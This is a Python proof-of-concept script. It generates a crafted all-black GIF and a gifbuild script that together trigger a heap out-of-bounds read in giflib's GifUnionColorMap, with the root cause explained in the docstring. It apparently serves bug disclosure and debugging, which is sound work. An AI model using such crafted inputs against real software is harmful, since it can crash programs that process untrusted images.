#!/usr/bin/env python3
"""Generate inputs that trigger a heap-buffer-underflow in GifUnionColorMap.

heap-buffer-overflow READ in GifUnionColorMap (lib/gifalloc.c:148)

The while loop at line 148 decrements CrntSlot without checking if it reaches 0.
When ALL colors in ColorIn1 are {0,0,0}, CrntSlot hits 0 and the loop reads
Colors[-1] — 3 bytes before the heap allocation.

This requires two files:
  1. allblack.gif — a GIF with an all-black 2-entry colormap
  2. trigger.txt — a gifbuild script that includes the GIF, forcing GifUnionColorMap

Usage:
    python3 gen_gifalloc_underflow.py
    gifbuild < poc_gifalloc_trigger.txt > /dev/null    # triggers ASAN crash
"""

import struct

# --- Generate allblack.gif ---

data = bytearray()
data += b"GIF89a"
data += struct.pack("<H", 1)  # width
data += struct.pack("<H", 1)  # height
data += bytes([0x80, 0, 0])  # packed: global CT, 2 colors
for _ in range(2):
    data += bytes([0, 0, 0])  # both colors are black
data += bytes([0x2C])  # image separator
data += struct.pack("<H", 0)  # left
data += struct.pack("<H", 0)  # top
data += struct.pack("<H", 1)  # width
data += struct.pack("<H", 1)  # height
data += bytes([0x00, 0x02, 0x02, 0x54, 0x01, 0x00, 0x3B])

with open("poc_allblack.gif", "wb") as f:
    f.write(data)

# --- Generate trigger.txt ---

trigger = """\
screen width 1
screen height 1
screen colors 2
screen background 0
pixel aspect byte 0

screen map
\tsort flag off
\trgb 000 000 000 is 0
\trgb 000 000 000 is 1
end

include poc_allblack.gif

image # 1
image left 0
image top 0
image bits 1 by 1
0
"""

with open("poc_gifalloc_trigger.txt", "w") as f:
    f.write(trigger)

print("Generated: poc_allblack.gif, poc_gifalloc_trigger.txt")
